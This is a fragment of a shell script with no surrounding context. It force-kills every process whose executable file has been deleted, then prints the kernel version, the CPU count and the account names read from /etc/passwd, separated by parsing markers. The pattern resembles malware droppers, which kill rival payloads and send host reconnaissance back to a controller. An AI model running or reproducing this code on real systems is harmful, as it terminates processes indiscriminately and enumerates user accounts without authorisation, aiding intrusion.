    pid=${proc_dir##*/}

    result=$(ls -l "/proc/$pid/exe" 2> /dev/null)

    if [ "$result" != "${result%(deleted)}" ]; then
        kill -9 "$pid"
    fi
done

uname -a 2>/dev/null
echo "___NPROC___"
nproc 2>/dev/null || grep -c ^processor /proc/cpuinfo 2>/dev/null
echo "___PASSWD___"
(cat /etc/passwd 2>/dev/null || getent passwd 2>/dev/null) | cut -d: -f1
